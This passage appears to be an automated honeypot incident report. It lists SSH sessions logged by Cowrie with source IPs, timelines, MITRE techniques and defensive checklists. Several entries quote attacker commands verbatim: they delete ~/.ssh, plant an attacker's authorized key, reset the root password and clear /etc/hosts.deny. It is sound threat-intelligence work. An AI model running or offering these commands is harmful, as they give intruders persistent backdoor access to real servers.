- [ ] Submit `152.32.131[.]10` to AbuseIPDB if not already reported
- [ ] Block `152.32.131[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93cb08d54d63

| Field | Detail |
|---|---|
| **Source IP** | `118.194.229[.]94` |
| **First Seen** | 2026-07-06 11:05 |
| **Last Seen** | 2026-07-06 11:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:05:05` | `cowrie.session.connect` |
| `2026-07-06 11:05:05` | `cowrie.client.version` |
| `2026-07-06 11:05:06` | `cowrie.client.kex` |
| `2026-07-06 11:05:06` | `cowrie.login.success` |
| `2026-07-06 11:05:07` | `cowrie.session.params` |
| `2026-07-06 11:05:07` | `cowrie.command.input` |
| `2026-07-06 11:05:07` | `cowrie.command.failed` |
| `2026-07-06 11:05:08` | `cowrie.log.closed` |
| `2026-07-06 11:05:08` | `cowrie.session.params` |
| `2026-07-06 11:05:08` | `cowrie.command.input` |
| `2026-07-06 11:05:09` | `cowrie.session.file_download` |
| `2026-07-06 11:05:09` | `cowrie.log.closed` |
| `2026-07-06 11:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.229[.]94` to AbuseIPDB if not already reported
- [ ] Block `118.194.229[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-802c020b6069

| Field | Detail |
|---|---|
| **Source IP** | `118.194.229[.]94` |
| **First Seen** | 2026-07-06 11:05 |
| **Last Seen** | 2026-07-06 11:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:05:09` | `cowrie.session.connect` |
| `2026-07-06 11:05:09` | `cowrie.client.version` |
| `2026-07-06 11:05:09` | `cowrie.client.kex` |
| `2026-07-06 11:05:10` | `cowrie.login.success` |
| `2026-07-06 11:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.229[.]94` to AbuseIPDB if not already reported
- [ ] Block `118.194.229[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4627956f048a

| Field | Detail |
|---|---|
| **Source IP** | `118.194.229[.]94` |
| **First Seen** | 2026-07-06 11:05 |
| **Last Seen** | 2026-07-06 11:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:05:10` | `cowrie.session.connect` |
| `2026-07-06 11:05:10` | `cowrie.client.version` |
| `2026-07-06 11:05:10` | `cowrie.client.kex` |
| `2026-07-06 11:05:11` | `cowrie.login.success` |
| `2026-07-06 11:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.229[.]94` to AbuseIPDB if not already reported
- [ ] Block `118.194.229[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2f296109e46

| Field | Detail |
|---|---|
| **Source IP** | `152.53.0[.]56` |
| **First Seen** | 2026-07-06 11:07 |
| **Last Seen** | 2026-07-06 11:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:07:13` | `cowrie.session.connect` |
| `2026-07-06 11:07:13` | `cowrie.client.version` |
| `2026-07-06 11:07:13` | `cowrie.client.kex` |
| `2026-07-06 11:07:13` | `cowrie.login.success` |
| `2026-07-06 11:07:14` | `cowrie.session.params` |
| `2026-07-06 11:07:14` | `cowrie.command.input` |
| `2026-07-06 11:07:14` | `cowrie.command.failed` |
| `2026-07-06 11:07:14` | `cowrie.log.closed` |
| `2026-07-06 11:07:15` | `cowrie.session.params` |
| `2026-07-06 11:07:15` | `cowrie.command.input` |
| `2026-07-06 11:07:15` | `cowrie.session.file_download` |
| `2026-07-06 11:07:15` | `cowrie.log.closed` |
| `2026-07-06 11:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.53.0[.]56` to AbuseIPDB if not already reported
- [ ] Block `152.53.0[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8fb6e953fc0

| Field | Detail |
|---|---|
| **Source IP** | `152.53.0[.]56` |
| **First Seen** | 2026-07-06 11:07 |
| **Last Seen** | 2026-07-06 11:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:07:15` | `cowrie.session.connect` |
| `2026-07-06 11:07:15` | `cowrie.client.version` |
| `2026-07-06 11:07:15` | `cowrie.client.kex` |
| `2026-07-06 11:07:16` | `cowrie.login.success` |
| `2026-07-06 11:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.53.0[.]56` to AbuseIPDB if not already reported
- [ ] Block `152.53.0[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81d06b0e3b9b

| Field | Detail |
|---|---|
| **Source IP** | `152.53.0[.]56` |
| **First Seen** | 2026-07-06 11:07 |
| **Last Seen** | 2026-07-06 11:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:07:16` | `cowrie.session.connect` |
| `2026-07-06 11:07:16` | `cowrie.client.version` |
| `2026-07-06 11:07:16` | `cowrie.client.kex` |
| `2026-07-06 11:07:17` | `cowrie.login.success` |
| `2026-07-06 11:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.53.0[.]56` to AbuseIPDB if not already reported
- [ ] Block `152.53.0[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8c405ad1972

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 11:07 |
| **Last Seen** | 2026-07-06 11:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:07:53` | `cowrie.session.connect` |
| `2026-07-06 11:07:55` | `cowrie.client.version` |
| `2026-07-06 11:07:55` | `cowrie.client.kex` |
| `2026-07-06 11:08:01` | `cowrie.login.success` |
| `2026-07-06 11:08:05` | `cowrie.session.params` |
| `2026-07-06 11:08:05` | `cowrie.command.input` |
| `2026-07-06 11:08:06` | `cowrie.log.closed` |
| `2026-07-06 11:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-656491863d53

| Field | Detail |
|---|---|
| **Source IP** | `202.184.156[.]3` |
| **First Seen** | 2026-07-06 11:13 |
| **Last Seen** | 2026-07-06 11:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:13:28` | `cowrie.session.connect` |
| `2026-07-06 11:13:28` | `cowrie.client.version` |
| `2026-07-06 11:13:28` | `cowrie.client.kex` |
| `2026-07-06 11:13:29` | `cowrie.login.success` |
| `2026-07-06 11:13:30` | `cowrie.session.params` |
| `2026-07-06 11:13:30` | `cowrie.command.input` |
| `2026-07-06 11:13:30` | `cowrie.command.failed` |
| `2026-07-06 11:13:31` | `cowrie.log.closed` |
| `2026-07-06 11:13:31` | `cowrie.session.params` |
| `2026-07-06 11:13:31` | `cowrie.command.input` |
| `2026-07-06 11:13:32` | `cowrie.session.file_download` |
| `2026-07-06 11:13:32` | `cowrie.log.closed` |
| `2026-07-06 11:13:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.184.156[.]3` to AbuseIPDB if not already reported
- [ ] Block `202.184.156[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f49406226af3

| Field | Detail |
|---|---|
| **Source IP** | `202.184.156[.]3` |
| **First Seen** | 2026-07-06 11:13 |
| **Last Seen** | 2026-07-06 11:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:13:32` | `cowrie.session.connect` |
| `2026-07-06 11:13:32` | `cowrie.client.version` |
| `2026-07-06 11:13:32` | `cowrie.client.kex` |
| `2026-07-06 11:13:33` | `cowrie.login.success` |
| `2026-07-06 11:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.184.156[.]3` to AbuseIPDB if not already reported
- [ ] Block `202.184.156[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5108af043a77

| Field | Detail |
|---|---|
| **Source IP** | `202.184.156[.]3` |
| **First Seen** | 2026-07-06 11:13 |
| **Last Seen** | 2026-07-06 11:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:13:34` | `cowrie.session.connect` |
| `2026-07-06 11:13:34` | `cowrie.client.version` |
| `2026-07-06 11:13:34` | `cowrie.client.kex` |
| `2026-07-06 11:13:35` | `cowrie.login.success` |
| `2026-07-06 11:13:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.184.156[.]3` to AbuseIPDB if not already reported
- [ ] Block `202.184.156[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba2cbd8d4b1c

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-07-06 11:15 |
| **Last Seen** | 2026-07-06 11:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:15:06` | `cowrie.session.connect` |
| `2026-07-06 11:15:06` | `cowrie.client.version` |
| `2026-07-06 11:15:06` | `cowrie.client.kex` |
| `2026-07-06 11:15:07` | `cowrie.login.success` |
| `2026-07-06 11:15:08` | `cowrie.session.params` |
| `2026-07-06 11:15:08` | `cowrie.command.input` |
| `2026-07-06 11:15:08` | `cowrie.command.failed` |
| `2026-07-06 11:15:09` | `cowrie.log.closed` |
| `2026-07-06 11:15:10` | `cowrie.session.params` |
| `2026-07-06 11:15:10` | `cowrie.command.input` |
| `2026-07-06 11:15:10` | `cowrie.session.file_download` |
| `2026-07-06 11:15:10` | `cowrie.log.closed` |
| `2026-07-06 11:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed352ba66a71

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-07-06 11:15 |
| **Last Seen** | 2026-07-06 11:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:15:11` | `cowrie.session.connect` |
| `2026-07-06 11:15:11` | `cowrie.client.version` |
| `2026-07-06 11:15:11` | `cowrie.client.kex` |
| `2026-07-06 11:15:12` | `cowrie.login.success` |
| `2026-07-06 11:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfaf692afeda

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-07-06 11:15 |
| **Last Seen** | 2026-07-06 11:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:15:12` | `cowrie.session.connect` |
| `2026-07-06 11:15:12` | `cowrie.client.version` |
| `2026-07-06 11:15:13` | `cowrie.client.kex` |
| `2026-07-06 11:15:14` | `cowrie.login.success` |
| `2026-07-06 11:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c589dd526803

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 11:20 |
| **Last Seen** | 2026-07-06 11:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:20:07` | `cowrie.session.connect` |
| `2026-07-06 11:20:08` | `cowrie.client.version` |
| `2026-07-06 11:20:08` | `cowrie.client.kex` |
| `2026-07-06 11:20:14` | `cowrie.login.success` |
| `2026-07-06 11:20:17` | `cowrie.session.params` |
| `2026-07-06 11:20:17` | `cowrie.command.input` |
| `2026-07-06 11:20:18` | `cowrie.log.closed` |
| `2026-07-06 11:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e5c47946815

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 11:22 |
| **Last Seen** | 2026-07-06 11:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:22:32` | `cowrie.session.connect` |
| `2026-07-06 11:22:32` | `cowrie.client.version` |
| `2026-07-06 11:22:32` | `cowrie.client.kex` |
| `2026-07-06 11:22:33` | `cowrie.login.success` |
| `2026-07-06 11:22:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc0b51935114

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-06 11:22 |
| **Last Seen** | 2026-07-06 11:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:22:33` | `cowrie.session.connect` |
| `2026-07-06 11:22:33` | `cowrie.client.version` |
| `2026-07-06 11:22:33` | `cowrie.client.kex` |
| `2026-07-06 11:22:34` | `cowrie.login.success` |
| `2026-07-06 11:22:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2b1b1b5c2b6

| Field | Detail |
|---|---|
| **Source IP** | `117.173.65[.]4` |
| **First Seen** | 2026-07-06 11:24 |
| **Last Seen** | 2026-07-06 11:24 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:A3XcaMolep4A"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:24:10` | `cowrie.session.connect` |
| `2026-07-06 11:24:10` | `cowrie.client.version` |
| `2026-07-06 11:24:11` | `cowrie.client.kex` |
| `2026-07-06 11:24:13` | `cowrie.login.success` |
| `2026-07-06 11:24:14` | `cowrie.session.params` |
| `2026-07-06 11:24:14` | `cowrie.command.input` |
| `2026-07-06 11:24:14` | `cowrie.command.failed` |
| `2026-07-06 11:24:15` | `cowrie.log.closed` |
| `2026-07-06 11:24:16` | `cowrie.session.params` |
| `2026-07-06 11:24:16` | `cowrie.command.input` |
| `2026-07-06 11:24:16` | `cowrie.session.file_download` |
| `2026-07-06 11:24:16` | `cowrie.log.closed` |
| `2026-07-06 11:24:33` | `cowrie.session.params` |
| `2026-07-06 11:24:33` | `cowrie.command.input` |
| `2026-07-06 11:24:34` | `cowrie.log.closed` |
| `2026-07-06 11:24:35` | `cowrie.session.params` |
| `2026-07-06 11:24:35` | `cowrie.command.input` |
| `2026-07-06 11:24:36` | `cowrie.log.closed` |
| `2026-07-06 11:24:37` | `cowrie.session.params` |
| `2026-07-06 11:24:37` | `cowrie.command.input` |
| `2026-07-06 11:24:37` | `cowrie.session.file_download` |
| `2026-07-06 11:24:37` | `cowrie.log.closed` |
| `2026-07-06 11:24:38` | `cowrie.session.params` |
| `2026-07-06 11:24:38` | `cowrie.command.input` |
| `2026-07-06 11:24:39` | `cowrie.log.closed` |
| `2026-07-06 11:24:40` | `cowrie.session.params` |
| `2026-07-06 11:24:40` | `cowrie.command.input` |
| `2026-07-06 11:24:40` | `cowrie.log.closed` |
| `2026-07-06 11:24:41` | `cowrie.session.params` |
| `2026-07-06 11:24:41` | `cowrie.command.input` |
| `2026-07-06 11:24:41` | `cowrie.command.input` |
| `2026-07-06 11:24:42` | `cowrie.log.closed` |
| `2026-07-06 11:24:43` | `cowrie.session.params` |
| `2026-07-06 11:24:43` | `cowrie.command.input` |
| `2026-07-06 11:24:43` | `cowrie.log.closed` |
| `2026-07-06 11:24:44` | `cowrie.session.params` |
| `2026-07-06 11:24:44` | `cowrie.command.input` |
| `2026-07-06 11:24:45` | `cowrie.log.closed` |
| `2026-07-06 11:24:46` | `cowrie.session.params` |
| `2026-07-06 11:24:46` | `cowrie.command.input` |
| `2026-07-06 11:24:47` | `cowrie.log.closed` |
| `2026-07-06 11:24:48` | `cowrie.session.params` |
| `2026-07-06 11:24:48` | `cowrie.command.input` |
| `2026-07-06 11:24:49` | `cowrie.log.closed` |
| `2026-07-06 11:24:49` | `cowrie.session.params` |
| `2026-07-06 11:24:49` | `cowrie.command.input` |
| `2026-07-06 11:24:50` | `cowrie.log.closed` |
| `2026-07-06 11:24:51` | `cowrie.session.params` |
| `2026-07-06 11:24:51` | `cowrie.command.input` |
| `2026-07-06 11:24:52` | `cowrie.log.closed` |
| `2026-07-06 11:24:52` | `cowrie.session.params` |
| `2026-07-06 11:24:52` | `cowrie.command.input` |
| `2026-07-06 11:24:53` | `cowrie.log.closed` |
| `2026-07-06 11:24:54` | `cowrie.session.params` |
| `2026-07-06 11:24:54` | `cowrie.command.input` |
| `2026-07-06 11:24:54` | `cowrie.log.closed` |
| `2026-07-06 11:24:55` | `cowrie.session.params` |
| `2026-07-06 11:24:55` | `cowrie.command.input` |
| `2026-07-06 11:24:56` | `cowrie.log.closed` |
| `2026-07-06 11:24:57` | `cowrie.session.params` |
| `2026-07-06 11:24:57` | `cowrie.command.input` |
| `2026-07-06 11:24:57` | `cowrie.log.closed` |
| `2026-07-06 11:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.173.65[.]4` to AbuseIPDB if not already reported
- [ ] Block `117.173.65[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ac1fef295ce

| Field | Detail |
|---|---|
| **Source IP** | `117.173.65[.]4` |
| **First Seen** | 2026-07-06 11:28 |
| **Last Seen** | 2026-07-06 11:33 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:28:40` | `cowrie.session.connect` |
| `2026-07-06 11:28:41` | `cowrie.client.version` |
| `2026-07-06 11:28:41` | `cowrie.client.kex` |
| `2026-07-06 11:28:43` | `cowrie.login.success` |
| `2026-07-06 11:28:44` | `cowrie.session.params` |
